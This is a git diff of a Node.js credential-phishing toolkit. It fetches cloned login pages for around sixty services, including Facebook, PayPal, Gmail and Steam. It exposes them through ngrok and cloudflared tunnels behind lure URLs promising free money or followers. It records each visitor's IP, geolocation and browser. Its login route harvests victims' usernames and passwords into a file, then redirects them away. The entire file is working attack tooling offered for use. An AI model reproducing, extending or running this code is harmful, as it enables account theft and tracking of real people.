@@ -8,15 +8,20 @@
 
 "use strict";
 try {
-	require("body-parser");
+	require("axios");
 } catch (e) {
 	console.clear();
 	if (e.code !== "MODULE_NOT_FOUND") {
 		throw e;
 	}
-	console.log("You don't have node_modules installed.");
+	console.log("You don't have modules installed.");
 	console.log("Installing dependencies...");
-	require("child_process").execSync("npm install");
+	try {
+		require("child_process").execSync("yarn install");
+		console.log("Used yarn to install dependencies.");
+	} catch {
+		require("child_process").execSync("npm install");
+	}
 	console.log("Installed all dependencies.");
 }
 const express = require("express");
@@ -35,7 +40,7 @@ const short = require("./short");
 const path = require("path");
 const fs = require("fs");
 
-const VERSION = "1.3";
+const VERSION = "1.3.1";
 const isTermux = process.platform === "android";
 const isLinux = process.platform === "linux" || isTermux;
 const logAsk = chalk.greenBright`[{whiteBright ?}]`;
@@ -44,6 +49,68 @@ const logError = chalk.redBright`[{whiteBright !}]`;
 const logInfo = chalk.yellowBright`[{whiteBright +}]`;
 const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
 const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
+const availableSites = {
+	Adobe: "https://github.com/gamerboytr/files/blob/master/phishingsites/adobe.rar",
+	Airtelsim: "https://github.com/gamerboytr/files/blob/master/phishingsites/airtelsim.rar",
+	Amazon: "https://github.com/gamerboytr/files/blob/master/phishingsites/amazon.rar",
+	Apple: "https://github.com/gamerboytr/files/blob/master/phishingsites/apple.rar",
+	Badoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/badoo.rar",
+	"Clash of Clans": "https://github.com/gamerboytr/files/blob/master/phishingsites/clashofclans.rar",
+	DeviantArt: "https://github.com/gamerboytr/files/blob/master/phishingsites/deviantart.rar",
+	Discord: "https://github.com/gamerboytr/files/blob/master/phishingsites/discord.rar",
+	Dropbox: "https://github.com/gamerboytr/files/blob/master/phishingsites/dropbox.rar",
+	eBay: "https://github.com/gamerboytr/files/blob/master/phishingsites/ebay.rar",
+	Facebook: "https://github.com/gamerboytr/files/blob/master/phishingsites/facebook.rar",
+	"Facebook Advenced": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_advanced.rar",
+	Messenger: "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_messenger.rar",
+	"Facebook Security": "https://github.com/gamerboytr/files/blob/master/phishingsites/fb_security.rar",
+	FreeFire: "https://github.com/gamerboytr/files/blob/master/phishingsites/freefire.rar",
+	Github: "https://github.com/gamerboytr/files/blob/master/phishingsites/github.rar",
+	Gitlab: "https://github.com/gamerboytr/files/blob/master/phishingsites/gitlab.rar",
+	Gmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/gmail.rar",
+	Google: "https://github.com/gamerboytr/files/blob/master/phishingsites/google.rar",
+	"Google Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/google_poll.rar",
+	iCloud: "https://github.com/gamerboytr/files/blob/master/phishingsites/icloud.rar",
+	"Insta Auto Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/ig_followers.rar",
+	"Insta 1000 Followers": "https://github.com/gamerboytr/files/blob/master/phishingsites/insta_followers.rar",
+	Instagram: "https://github.com/gamerboytr/files/blob/master/phishingsites/instagram.rar",
+	Jiorouter: "https://github.com/gamerboytr/files/blob/master/phishingsites/jiorouter.rar",
+	LinkedIn: "https://github.com/gamerboytr/files/blob/master/phishingsites/linkedin.rar",
+	Mediafire: "https://github.com/gamerboytr/files/blob/master/phishingsites/mediafire.rar",
+	Microsoft: "https://github.com/gamerboytr/files/blob/master/phishingsites/microsoft.rar",
+	Myspace: "https://github.com/gamerboytr/files/blob/master/phishingsites/myspace.rar",
+	Netflix: "https://github.com/gamerboytr/files/blob/master/phishingsites/netflix.rar",
+	Origin: "https://github.com/gamerboytr/files/blob/master/phishingsites/origin.rar",
+	Outlook: "https://github.com/gamerboytr/files/blob/master/phishingsites/outlook.rar",
+	Paypal: "https://github.com/gamerboytr/files/blob/master/phishingsites/paypal.rar",
+	Pinterest: "https://github.com/gamerboytr/files/blob/master/phishingsites/pinterest.rar",
+	Playstation: "https://github.com/gamerboytr/files/blob/master/phishingsites/playstation.rar",
+	Protonmail: "https://github.com/gamerboytr/files/blob/master/phishingsites/protonmail.rar",
+	Pubg: "https://github.com/gamerboytr/files/blob/master/phishingsites/pubg.rar",
+	Quora: "https://github.com/gamerboytr/files/blob/master/phishingsites/quora.rar",
+	Reddit: "https://github.com/gamerboytr/files/blob/master/phishingsites/reddit.rar",
+	Roblox: "https://github.com/gamerboytr/files/blob/master/phishingsites/roblox.rar",
+	Shopify: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopify.rar",
+	Shopping: "https://github.com/gamerboytr/files/blob/master/phishingsites/shopping.rar",
+	Snapchat: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat.rar",
+	Snapchat2: "https://github.com/gamerboytr/files/blob/master/phishingsites/snapchat2.rar",
+	SocialClub: "https://github.com/gamerboytr/files/blob/master/phishingsites/socialclub.rar",
+	Spotify: "https://github.com/gamerboytr/files/blob/master/phishingsites/spotify.rar",
+	Stackoverflow: "https://github.com/gamerboytr/files/blob/master/phishingsites/stackoverflow.rar",
+	Steam: "https://github.com/gamerboytr/files/blob/master/phishingsites/steam.rar",
+	Telegram: "https://github.com/gamerboytr/files/blob/master/phishingsites/telegram.rar",
+	TikTok: "https://github.com/gamerboytr/files/blob/master/phishingsites/tiktok.rar",
+	Twitch: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitch.rar",
+	Twitter: "https://github.com/gamerboytr/files/blob/master/phishingsites/twitter.rar",
+	Verizon: "https://github.com/gamerboytr/files/blob/master/phishingsites/verizon.rar",
+	VK: "https://github.com/gamerboytr/files/blob/master/phishingsites/vk.rar",
+	"VK Poll": "https://github.com/gamerboytr/files/blob/master/phishingsites/vk_poll.rar",
+	"Wi-Fi": "https://github.com/gamerboytr/files/blob/master/phishingsites/wifi.rar",
+	Wordpress: "https://github.com/gamerboytr/files/blob/master/phishingsites/wordpress.rar",
+	Yahoo: "https://github.com/gamerboytr/files/blob/master/phishingsites/yahoo.rar",
+	Yandex: "https://github.com/gamerboytr/files/blob/master/phishingsites/yandex.rar",
+};
+let siteConfig = {};
 
 const logLogo =
 	chalk.red`       _     _____  _     _     _               \n` +
@@ -57,73 +124,6 @@ const logLogo =
 
 console.clear();
 console.log(logLogo);
-const availableSites = [
-	"Facebook Traditional",
-	"Facebook Voting",
-	"Facebook Security",
-	"Messenger",
-	"Instagram Traditional",
-	"Insta Auto Followers",
-	"Insta 1000 Followers",
-	"Insta Blue Verify",
-	"Gmail Old",
-	"Gmail New",
-	"Gmail Poll",
-	"Microsoft",
-	"Netflix",
-	"Paypal",
-	"Steam",
-	"Twitter",
-	"PlayStation",
-	"TikTok",
-	"Twitch",
-	"Pinterest",
-	"SnapChat",
-	"LinkedIn",
-	"Ebay",
-	"Quora",
-	"Protonmail",
-	"Spotify",
-	"Reddit",
-	"Adobe",
-	"DevianArt",
-	"Badoo",
-	"Clash Of Clans",
-	"Ajio",
-	"JioRouter",
-	"FreeFire",
-	"Pubg",
-	"Telegram",
-	"Youtube",
-	"Airtel",
-	"SocialClub",
-	"Ola",
-	"Outlook",
-	"Amazon",
-	"Origin",
-	"DropBox",
-	"Yahoo",
-	"WordPress",
-	"Yandex",
-	"StackOverflow",
-	"VK",
-	"VK Poll",
-	"Xbox",
-	"Mediafire",
-	"Gitlab",
-	"Github",
-	"Apple",
-	"iCloud",
-	"Shopify",
-	"Myspace",
-	"Shopping",
-	"Cryptocurrency",
-	"SnapChat2",
-	"Verizon",
-	"Wi-Fi",
-	"Discord",
-	"Roblox",
-];
 const loggedIps = [];
 if (process.platform === "darwin") {
 	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
@@ -137,20 +137,25 @@ app.disable("x-powered-by");
 (async () => {
 	await controlVersion().catch(throwError);
 	await installRequirements().catch(throwError);
-	const selectedSite = await selectSite().catch(throwError);
+	siteConfig = (await selectSite().catch(throwError)).config;
 	console.clear();
 	console.log(logLogo);
+	console.log(chalk.magenta`${logInfo2} Selected {bold ${siteConfig.name}}\n`);
 	if (isTermux) {
 		console.log(chalk.magenta`${logInfo} If you haven't enabled hotspot, please enable it!\n`);
 		await new Promise(r => setTimeout(r, 1000));
 	}
 	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
-	await new Promise(r =>
-		app.listen(port, _ => {
-			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
-			r();
-		})
-	);
+	await new Promise(r => {
+		try {
+			app.listen(port, _ => {
+				console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
+				r();
+			});
+		} catch (e) {
+			throwError(e);
+		}
+	});
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
 	const ngrok = await openNgrok(port).catch(throwError);
 	const shortNgrok = await short(ngrok).catch(throwError);
@@ -159,11 +164,11 @@ app.disable("x-powered-by");
 	if (!isTermux) {
 		console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 		console.log(chalk.magenta`${logInfo2} URL 1 > {yellowBright ${cloudflared}}\n`);
-		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${selectedSite.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
+		console.log(chalk.magenta`${logInfo2} URL 2 > {yellowBright ${siteConfig.mask + "@" + shortCf.split("/").slice(2).join("/")}}\n\n`);
 	}
 	console.log(chalk.greenBright`${logSuccess} Your urls are given below:\n`);
 	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "3"} > {yellowBright ${ngrok}}\n`);
-	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${selectedSite.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
+	console.log(chalk.magenta`${logInfo2} URL ${isTermux ? "1" : "4"} > {yellowBright ${siteConfig.mask + "@" + shortNgrok.split("/").slice(2).join("/")}}\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for ip info... {cyanBright Press {red Ctrl+C} to exit}`);
 	if (process.platform === "win32") {
 		require("readline")
@@ -189,8 +194,7 @@ app.all("/", async (req, res) => {
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP                   :  ${ip}`);
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} IP Type              :  ${request.type}`);
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User OS              :  ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`);
-		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser.name ?? "Unknown"}`);
-		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Version              :  ${ua.browser.version ?? "Unknown"}`);
+		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Browser              :  ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`);
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Location             :  ${request?.city ?? "Unknown"}`);
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} GeoLocation(lat, lon):  ${location.ll.join(", ")}`);
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Curreny              :  ${request.currency_code}`);
@@ -198,7 +202,22 @@ app.all("/", async (req, res) => {
 		console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} UserAgent            :  ${userAgent ?? "No agent"}\n`);
 
 		loggedIps.push(ip);
-		fs.appendFileSync("./ip.txt", `${ip} - ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"} - ${ua.browser.name ?? "Unknown"}${" " + ua.browser.version ?? ""} - ${location?.city ?? "Unknown"} - ${location.ll.join(", ")} - ${referer ?? "No referer"}\n`);
+		fs.appendFileSync(
+			"./ip.txt",
+			[
+				`========================${siteConfig.name} ${new Date().toLocaleString()}========================`,
+				`IP: ${ip}`,
+				`IP Type: ${request.type}`,
+				`User OS: ${ua.os?.name ? `${ua.os.name} ${ua.os.version}` : "Unknown"}`,
+				`Browser: ${ua.browser?.name ?? "Unknown"} ${ua.browser?.version}`,
+				`Location: ${request?.city ?? "Unknown"}`,
+				`GeoLocation(lat, lon): ${location.ll.join(", ")}`,
+				`Curreny: ${request.currency_code}`,
+				`Referer: ${referer ?? "No referer"}`,
+				`UserAgent: ${userAgent ?? "No agent"}`,
+				"",
+			].join("\n")
+		);
 		console.log(chalk.cyan`${logInfo} Saved in ip.txt\n`);
 		console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
 	}
@@ -207,16 +226,16 @@ app.all("/", async (req, res) => {
 app.post(["/login", "/login.php"], (req, res) => {
 	const { username, password } = req.body;
 	if (!username?.trim?.() || !password?.trim?.()) {
-		res.redirect("/login");
+		res.redirect("login");
 		return;
 	}
-	res.redirect("https://www.google.com/search?q=How+can+I+get+my+stolen+account+back+%3B%29");
+	res.redirect(siteConfig?.redirect ?? "https://google.com");
 	console.log(chalk.greenBright`${logSuccess} Victim login info found!\n`);
 
-	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Username:  ${username}`);
-	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} User Password:  ${password}\n`);
+	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Username:  ${username}`);
+	console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} ${siteConfig?.name ?? "Victim"} Password:  ${password}\n`);
 
-	fs.appendFileSync("./accounts.txt", `${username}:${password}\n`);
+	fs.appendFileSync("./accounts.txt", `========================${siteConfig.name.toUpperCase()} ${new Date().toLocaleString()}========================\nUsername : ${username}\nPassword : ${password}\n`);
 	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
 });
@@ -383,9 +402,9 @@ function throwError(error) {
 }
 
 function selectSite() {
-	return new Promise(async (resolve, reject) => {
-		availableSites.forEach((site, index) => {
-			const maxLength = Math.max(...availableSites.map(s => s.length)) + 10;
+	return new Promise(async resolve => {
+		Object.keys(availableSites).forEach((site, index) => {
+			const maxLength = Math.max(...Object.keys(availableSites).map(s => s.length)) + 10;
 			let spacing = " ".repeat(maxLength);
 			spacing = spacing.substring(0, maxLength - site.length);
 			spacing = ((index + 1) / 3) % 1 === 0 ? "\n" : spacing;
@@ -393,221 +412,25 @@ function selectSite() {
 		});
 		console.log(chalk.yellowBright`\n\n{greenBright [}{whiteBright 0}{greenBright ]} Exit\n`);
 		const choose = readlineSync.prompt({ prompt: chalk.yellowBright`${logAsk} Select one of the options > ` });
-		let folder;
-		let mask;
-		if (choose == "1" || choose == "01") {
-			folder = "facebook";
-			mask = "https://blue-verified-facebook-free";
-		} else if (choose === "2" || choose == "02") {
-			folder = "fb_advanced";
-			mask = "https://vote-for-the-best-social-media";
-		} else if (choose === "3" || choose == "03") {
-			folder = "fb_security";
-			mask = "https://make-your-facebook-secured-and-free-from-hackers";
-		} else if (choose === "4" || choose == "04") {
-			folder = "fb_messenger";
-			mask = "https://get-messenger-premium-features-free";
-		} else if (choose === "5" || choose == "05") {
-			folder = "instagram";
-			mask = "https://get-unlimited-followers-for-instagram";
-		} else if (choose === "6" || choose == "06") {
-			folder = "ig_followers";
-			mask = "https://get-unlimited-followers-for-instagram";
-		} else if (choose === "7" || choose == "07") {
-			folder = "insta_followers";
-			mask = "https://get-1000-followers-for-instagram";
-		} else if (choose === "8" || choose == "08") {
-			folder = "ig_verify";
-			mask = "https://blue-badge-verify-for-instagram-free";
-		} else if (choose === "9" || choose == "09") {
-			folder = "google";
-			mask = "https://get-unlimited-google-drive-free";
-		} else if (choose === "10") {
-			folder = "google_new";
-			mask = "https://get-unlimited-google-drive-free";
-		} else if (choose === "11") {
-			folder = "google_poll";
-			mask = "https://vote-for-the-best-social-media";
-		} else if (choose === "12") {
-			folder = "microsoft";
-			mask = "https://unlimited-onedrive-space-for-free";
-		} else if (choose === "13") {
-			folder = "netflix";
-			mask = "https://upgrade-your-netflix-plan-free";
-		} else if (choose === "14") {
-			folder = "paypal";
-			mask = "https://get-500-usd-free-to-your-account";
-		} else if (choose === "15") {
-			folder = "steam";
-			mask = "https://steam-500-usd-gift-card-free";
-		} else if (choose === "16") {
-			folder = "twitter";
-			mask = "https://get-blue-badge-on-twitter-free";
-		} else if (choose === "17") {
-			folder = "playstation";
-			mask = "https://playstation-500-usd-gift-card-free";
-		} else if (choose === "18") {
-			folder = "tiktok";
-			mask = "https://tiktok-free-liker";
-		} else if (choose === "19") {
-			folder = "twitch";
-			mask = "https://unlimited-twitch-tv-user-for-free";
-		} else if (choose === "20") {
-			folder = "pinterest";
-			mask = "https://get-a-premium-plan-for-pinterest-free";
-		} else if (choose === "21") {
-			folder = "snapchat";
-			mask = "https://view-locked-snapchat-accounts-secretly";
-		} else if (choose === "22") {
-			folder = "linkedin";
-			mask = "https://get-a-premium-plan-for-linkedin-free";
-		} else if (choose === "23") {
-			folder = "ebay";
-			mask = "https://get-500-usd-free-to-your-account";
-		} else if (choose === "24") {
-			folder = "quora";
-			mask = "https://quora-premium-for-free";
-		} else if (choose === "25") {
-			folder = "protonmail";
-			mask = "https://protonmail-pro-basics-for-free";
-		} else if (choose === "26") {
-			folder = "spotify";
-			mask = "https://convert-your-account-to-spotify-premium";
-		} else if (choose === "27") {
-			folder = "reddit";
-			mask = "https://reddit-official-verified-member-badge";
-		} else if (choose === "28") {
-			folder = "adobe";
-			mask = "https://get-adobe-lifetime-pro-membership-free";
-		} else if (choose === "29") {
-			folder = "deviantart";
-			mask = "https://get-500-usd-free-to-your-acount";
-		} else if (choose === "30") {
-			folder = "badoo";
-			mask = "https://get-500-usd-free-to-your-acount";
-		} else if (choose === "31") {
-			folder = "clashofclans";
-			mask = "https://get-unlimited-gems-in-your-coc-account";
-		} else if (choose === "32") {
-			folder = "ajio";
-			mask = "https://get-limited-time-discount";
-		} else if (choose === "33") {
-			folder = "jiorouter";
-			mask = "https://get-premium-membership-free";
-		} else if (choose === "34") {
-			folder = "freefire";
-			mask = "https://get-unlimited-diamonds-in-your-ff-account";
-		} else if (choose === "35") {
-			folder = "pubg";
-			mask = "https://get-unlimited-diamonds-in-your-pubg-account";
-		} else if (choose === "36") {
-			folder = "telegram";
-			mask = "https://get-premium-membership-free";
-		} else if (choose === "37") {
-			folder = "youtube";
-			mask = "https://get-1k-like-in-any-video";
-		} else if (choose === "38") {
-			folder = "airtelsim";
-			mask = "https://get-500-cureency-free-to-your-account";
-		} else if (choose === "39") {
-			folder = "socialclub";
-			mask = "https://get-premium-membership-free";
-		} else if (choose === "40") {
-			folder = "ola";
-			mask = "https://book-a-cab-in-discount";
-		} else if (choose === "41") {
-			folder = "outlook";
-			mask = "https://grab-mail-from-anyother-outlook-account-free";
-		} else if (choose === "42") {
-			folder = "amazon";
-			mask = "https://get-limited-time-discount-free";
-		} else if (choose === "43") {
-			folder = "origin";
-			mask = "https://get-500-usd-free-to-your-acount";
-		} else if (choose === "44") {
-			folder = "dropbox";
-			mask = "https://get-1TB-cloud-storage-free";
-		} else if (choose === "45") {
-			folder = "yahoo";
-			mask = "https://grab-mail-from-anyother-yahoo-account-free";
-		} else if (choose === "46") {
-			folder = "wordpress";
-			mask = "https://unlimited-wordpress-traffic-free";
-		} else if (choose === "47") {
-			folder = "yandex";
-			mask = "https://grab-mail-from-anyother-yandex-account-free";
-		} else if (choose === "48") {
-			folder = "stackoverflow";
-			mask = "https://get-stackoverflow-lifetime-pro-membership-free";
-		} else if (choose === "49") {
-			folder = "vk";
-			mask = "https://vk-premium-real-method-2020";
-		} else if (choose === "50") {
-			folder = "vk_pole";
-			mask = "https://vote-for-the-best-social-media";
-		} else if (choose === "51") {
-			folder = "xbox";
-			mask = "https://get-500-usd-free-to-your-acount";
-		} else if (choose === "52") {
-			folder = "mediafire";
-			mask = "https://get-1TB-on-mediafire-free";
-		} else if (choose === "53") {
-			folder = "gitlab";
-			mask = "https://get-1k-followers-on-gitlab-free";
-		} else if (choose === "54") {
-			folder = "github";
-			mask = "https://get-1k-followers-on-github-free";
-		} else if (choose === "55") {
-			folder = "apple";
-			mask = "https://get-apple-premium-account-free";
-		} else if (choose === "56") {
-			folder = "icloud";
-			mask = "https://unlimited-storage-icloud-free";
-		} else if (choose === "57") {
-			folder = "shopify";
-			mask = "https://get-50%-discount-on-any-sale";
-		} else if (choose === "58") {
-			folder = "myspace";
-			mask = "https://get-1k-followers-on-myspace-free-free";
-		} else if (choose === "59") {
-			folder = "shopping";
-			mask = "https://get-50%-discount-on-any-sale";
-		} else if (choose === "60") {
-			folder = "cryptocurrency";
-			mask = "https://get-bitcoins-free";
-		} else if (choose === "61") {
-			folder = "snapchat2";
-			mask = "https://view-locked-snapchat-accounts-secretly";
-		} else if (choose === "62") {
-			folder = "verizon";
-			mask = "https://get-verizon-premium-account-free";
-		} else if (choose === "63") {
-			folder = "wifi";
-			mask = "https://reconnect-your-wifi";
-		} else if (choose === "64") {
-			folder = "discord";
-			mask = "https://security-bot-for-your-discord-free";
-		} else if (choose === "65") {
-			folder = "roblox";
-			mask = "https://play-premium-games-for-free";
-		} else if (choose == "0") {
+		if (choose == "0") {
 			onExit(true);
-		} else {
+		} else if (!choose || isNaN(parseInt(choose)) || Object.keys(availableSites).length < parseInt(choose) || parseInt(choose) < 0) {
 			console.clear();
 			console.log(chalk.redBright`${logError} Invalid input.`);
 			selectSite();
 			return;
 		}
-		await downloadSites(folder);
-		resolve({ site: folder, mask });
+		const folder = availableSites[Object.keys(availableSites)[parseInt(choose) - 1]].split("/").pop().split(".")[0];
+		const config = await downloadSites(folder).catch(throwError);
 		app.get("/login", (_req, res) => {
 			res.sendFile(path.join(__dirname, "bin", "websites", folder, "login.html"));
 		});
+		resolve({ site: folder, config });
 	});
 }
 
 function downloadSites(folder) {
-	return new Promise(async resolve => {
+	return new Promise(async (resolve, reject) => {
 		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder))) {
 			console.log(chalk.yellowBright(`${logInfo} Downloading required files...`));
 			try {
@@ -615,25 +438,23 @@ function downloadSites(folder) {
 					console.log(chalk.yellowBright(`${logInfo} Creating folder...`));
 					fs.mkdirSync(path.join(__dirname, "bin", "websites"));
 				}
-				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/KasRoudra/files/raw/main/phishingsites/${folder}.zip`).catch(throwError));
+				fs.writeFileSync(path.join(__dirname, "bin", "websites", folder + ".zip"), await downloader(`https://github.com/gamerboytr/files/raw/master/phishingsites/${folder}.zip`).catch(throwError));
 				console.log(chalk.greenBright(`${logSuccess} Downloaded successfully.`));
 				console.log(chalk.yellowBright(`${logInfo} Extracting files...`));
 				new AdmZip(path.join(__dirname, "bin", "websites", folder + ".zip")).extractAllTo(path.join(__dirname, "bin", "websites", folder), true);
 				console.log(chalk.greenBright(`${logSuccess} Extracted successfully.`));
-				console.log(chalk.yellowBright(`${logInfo} Deleting unnecessary files...`));
+				console.log(chalk.yellowBright(`${logInfo} Deleting zip file...`));
 				fs.unlinkSync(path.join(__dirname, "bin", "websites", folder + ".zip"));
-				fs.readdirSync(path.join(__dirname, "bin", "websites", folder)).forEach(file => {
-					if (!file.endsWith(".php")) {
-						return;
-					}
-					fs.unlinkSync(path.join(__dirname, "bin", "websites", folder, file));
-				});
 				console.log(chalk.greenBright(`${logSuccess} Deleted successfully.`));
 			} catch (error) {
 				console.log(chalk.redBright(`${logError} ${error}`));
 				onExit(true);
 			}
 		}
-		resolve();
+		if (!fs.existsSync(path.join(__dirname, "bin", "websites", folder, "config.json"))) {
+			reject("Cannot found config.json!");
+			return;
+		}
+		resolve(JSON.parse(fs.readFileSync(path.join(__dirname, "bin", "websites", folder, "config.json"), "utf8")));
 	});
 }
